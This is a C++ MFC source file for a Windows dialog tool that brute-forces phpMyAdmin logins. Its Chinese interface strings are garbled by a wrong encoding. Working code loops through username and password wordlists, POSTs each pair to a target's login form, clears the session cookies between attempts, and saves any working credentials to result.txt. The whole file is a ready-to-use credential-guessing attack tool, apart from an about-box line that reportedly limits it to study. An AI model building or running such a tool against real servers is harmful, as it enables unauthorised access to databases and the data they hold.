// phpMyAdmin�����ƽ�Dlg.cpp : implementation file
//

#include "stdafx.h"
#include "phpMyAdmin�����ƽ�.h"
#include "phpMyAdmin�����ƽ�Dlg.h"

#include <afxinet.h>
#include <afxmt.h>
//#include <Wininet.h>
//#pragma comment(lib, "Wininet.lib")


#define INTERNET_COOKIE_HTTPONLY        0x00002000

typedef BOOL (WINAPI *pfnInternetSetCookieEx)(LPCSTR, LPCSTR, LPCSTR, DWORD, DWORD); 
pfnInternetSetCookieEx InternetSetCookieEx = NULL;

UINT MyThread(LPVOID pParam);


#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	CString	m_help;
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	virtual BOOL OnInitDialog();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	m_help = _T("");
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	DDX_Text(pDX, IDC_EDIT1, m_help);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPhpMyAdminDlg dialog

CPhpMyAdminDlg::CPhpMyAdminDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPhpMyAdminDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CPhpMyAdminDlg)
	m_url = _T("");
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	XTPSkinManager()->SetApplyOptions(XTPSkinManager()->GetApplyOptions() | xtpSkinApplyMetrics);
	XTPSkinManager()->LoadSkin("C:\\styles", "");
}

void CPhpMyAdminDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CPhpMyAdminDlg)
	DDX_Text(pDX, IDC_EDIT_URL, m_url);
	DDV_MaxChars(pDX, m_url, 255);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CPhpMyAdminDlg, CDialog)
	//{{AFX_MSG_MAP(CPhpMyAdminDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDC_BTN_USER, OnBtnUser)
	ON_BN_CLICKED(IDC_BTN_PSW, OnBtnPsw)
	ON_BN_CLICKED(IDC_BTN_START, OnBtnStart)
	ON_BN_CLICKED(IDC_BTN_ABOUT, OnBtnAbout)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CPhpMyAdminDlg message handlers

BOOL CPhpMyAdminDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// Add "About..." menu item to system menu.

	// IDM_ABOUTBOX must be in the system command range.
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	// TODO: Add extra initialization here

	m_url = "http://www.nsfocus.com/phpmyadmin/";
	UpdateData(FALSE);

	HINSTANCE hInst = LoadLibrary("Wininet.DLL"); 
	if(hInst) { 
		InternetSetCookieEx = (pfnInternetSetCookieEx)GetProcAddress(hInst, "InternetSetCookieExA");
		FreeLibrary(hInst); 
	}

	return TRUE;  // return TRUE  unless you set the focus to a control
}

void CPhpMyAdminDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CPhpMyAdminDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CPhpMyAdminDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

void CPhpMyAdminDlg::OnBtnUser() 
{
	// TODO: Add your control notification handler code here
	//���ļ��Ի���
	char pszFilter[] = _T("Text File (*.txt)|*.txt|All Files (*.*)|*.*||");
	CFileDialog dlg(TRUE, NULL, 
		NULL, OFN_NOCHANGEDIR | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,	pszFilter, this);
	dlg.m_ofn.lpstrInitialDir = ".\\";
	if(dlg.DoModal() != IDOK) 
		return;
	UserFile = dlg.GetPathName();
	SetDlgItemText(IDC_EDIT_USERFILE, UserFile);
}

void CPhpMyAdminDlg::OnBtnPsw() 
{
	// TODO: Add your control notification handler code here
	//���ļ��Ի���
	char pszFilter[] = _T("Text File (*.txt)|*.txt|All Files (*.*)|*.*||");
	CFileDialog dlg(TRUE, NULL, 
		NULL, OFN_NOCHANGEDIR | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT,	pszFilter, this);
	dlg.m_ofn.lpstrInitialDir = ".\\";
	if(dlg.DoModal() != IDOK) 
		return;
	PswFile = dlg.GetPathName();
	SetDlgItemText(IDC_EDIT_PSWFILE, PswFile);
}

void CPhpMyAdminDlg::OnBtnStart() 
{
	// TODO: Add your control notification handler code here
	UpdateData();

	if ( m_url.IsEmpty() || 0 == m_url.Compare("http://www.nsfocus.com/phpmyadmin/"))
	{
		MessageBox("  ����дphpMyAdmin��ڵ�ַ��");
		//m_url = "";
		((CEdit*)GetDlgItem(IDC_EDIT_URL))->SetFocus();
		((CEdit*)GetDlgItem(IDC_EDIT_URL))->SetSel(7, 22);
		UpdateData(FALSE);
		return;
	}


	//���ı�����Ϊ׼����Ϊ�����û�����·��
	GetDlgItemText(IDC_EDIT_USERFILE, UserFile);
	GetDlgItemText(IDC_EDIT_PSWFILE, PswFile);

	if (UserFile.IsEmpty())
	{
		MessageBox(" ��ѡ���û����ֵ��ļ���");
		return;
	}

	if (PswFile.IsEmpty())
	{
		MessageBox(" ��ѡ�������ֵ��ļ���");
		return;
	}

	//�����߳�
	AfxBeginThread(MyThread, this, THREAD_PRIORITY_NORMAL);

}


void CPhpMyAdminDlg::OnBtnAbout() 
{
	// TODO: Add your control notification handler code here
	CAboutDlg DLG;
	DLG.DoModal();
}

UINT MyThread(LPVOID pParam) 
{
	// TODO: Add your control notification handler code here

	CPhpMyAdminDlg *pWnd = (CPhpMyAdminDlg*)pParam;
	char user[31]={0};
	char psw[100]={0};
	//AfxMessageBox(pWnd->UserFile);
	FILE *pf1 = fopen(pWnd->UserFile.GetBuffer(0), "r");
	FILE *pf2 = fopen(pWnd->PswFile.GetBuffer(0), "r");
	while( EOF != fscanf(pf1, "%s", user ) )
	{
		pWnd->CrackProc(user, ""); // ������
		fseek(pf2, 0, SEEK_SET);
		while( EOF != fscanf(pf2, "%s", psw ) )
		{
			pWnd->CrackProc(user, psw);
			memset(psw, 0, 100);
		}
		
		memset(user, 0, 31);
	}
	fclose(pf1);
	fclose(pf2);
	AfxMessageBox(" ������ϣ�δ�ҵ��ɵ�½���û��������룡\n");
	
	return 0;
}

BOOL CPhpMyAdminDlg::CrackProc(CString User, CString Psw)
{
	CString request, server, object, str;
	DWORD dwServiceType;
	INTERNET_PORT nPort;

	str.Format("���Ե�½��%s -- %s", User, Psw);
	SetDlgItemText(IDC_STATUS, str);

	//request="pma_username="+User+"&pma_password="+Psw+"&server=1&lang=zh-utf-8&convcharset=iso-8859-1";
	request = "pma_username="+User+"&pma_password="+Psw+"&server=1";
	//MessageBox(request);


    if ( !AfxParseURL(m_url, dwServiceType, server, object, nPort ) ||
		dwServiceType != INTERNET_SERVICE_HTTP ) 
	{
		MessageBox("\r\n  ���Ϸ���URL��ַ�� ");
        return FALSE;
	}

	//InternetSetCookie(m_url, NULL, " phpMyAdmin=; expires=Thu, 01-Jan-1900 00:00:01 GMT"); //HttpOnly������IE8���޷�ɾ��

	//InternetSetCookieEx(m_url, NULL, " phpMyAdmin=; expires=Thu, 01-Jan-1900 00:00:01 GMT", INTERNET_COOKIE_HTTPONLY, NULL);
	InternetSetCookieEx(m_url, NULL, " phpMyAdmin=; expires=Thu, 01-Jan-1900 00:00:01 GMT", INTERNET_COOKIE_HTTPONLY, NULL);
	InternetSetCookieEx(m_url, NULL, " pma_mcrypt_iv=; expires=Thu, 01-Jan-1900 00:00:01 GMT", INTERNET_COOKIE_HTTPONLY, NULL);
	InternetSetCookieEx(m_url, NULL, " pmaUser-1=; expires=Thu, 01-Jan-1900 00:00:01 GMT", INTERNET_COOKIE_HTTPONLY, NULL);
	InternetSetCookieEx(m_url, NULL, " pmaPass-1=; expires=Thu, 01-Jan-1900 00:00:01 GMT", INTERNET_COOKIE_HTTPONLY, NULL);
	CInternetSession m_InetSession("hello phpMyAdmin!");
    CHttpConnection* pServer = NULL;
    CHttpFile * pFile = NULL;
    try {
        pServer = m_InetSession.GetHttpConnection(server, nPort);
        pFile = pServer->OpenRequest(CHttpConnection::HTTP_VERB_POST, object);
        CString strHeaders = "Accept: text/*\r\nContent-Type: application/x-www-form-urlencoded";
		pFile->AddRequestHeaders(strHeaders);
		//m_InetSession.SetCookie(m_url, NULL, " phpMyAdmin=; expires=Thu, 01-Jan-1900 00:00:01 GMT; path=/phpmyadmin/");
        pFile->SendRequestEx(request.GetLength());
        pFile->WriteString(request);
        pFile->EndRequest();
        DWORD dwRet;
        pFile->QueryInfoStatusCode(dwRet);
        CMutex m_Mutex;
        m_Mutex.Lock();
        CString m_strHtml;
        char szBuff[1024];
        if (dwRet == HTTP_STATUS_OK){
            UINT nRead;
            while ((nRead = pFile->Read(szBuff,1023))>0)
            {
                m_strHtml+=CString(szBuff, nRead);
            }
        }
        m_Mutex.Unlock();
        delete pFile;
        delete pServer;
		//MessageBox(m_strHtml);
		if ( m_strHtml.IsEmpty() || m_strHtml.Find("pma_password") != -1 ) {
			//MessageBox("   ��¼ʧ�ܣ� ", "����");
			return FALSE;
		}
    }
    catch (CInternetException* e){
		//Beep(1000, 1000);
		e->Delete();
        //CString s;
        //s.Format("Internet Exception\r\nm_dwError%u,m_dwContextError%u",e->m_dwError,e->m_dwContext);
        //AfxMessageBox(s);
        return FALSE;
    }

	FILE *pf = fopen("result.txt", "w");
	fprintf(pf, "phpMyAdmin��ڵ�ַ��%s\n�û�����%s\n���룺%s\n", m_url.GetBuffer(0), User.GetBuffer(0), Psw.GetBuffer(0));
	fclose(pf);

	str.Format("  Good luck! �û�����%s�����룺%s   \n ��������ڵ�ǰĿ¼��result.txt��", User, Psw);
	
	MessageBox(str, "���Ƴɹ���");
	WinExec("notepad.exe result.txt", SW_SHOW);

	exit(0);

	return TRUE;
}

BOOL CAboutDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	m_help = "˵����\r\n   phpMyAdmin��Ȩ��֤Ϊhttp���ͽ�����֧�֣�\r\n���Լ��������ռ�MySQL�ֵ��ļ���\
\r\n���߽������Ѽ���ѧϰ����ʹ�ã��������ڷǷ���;��\r\n";
	UpdateData(FALSE);
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}
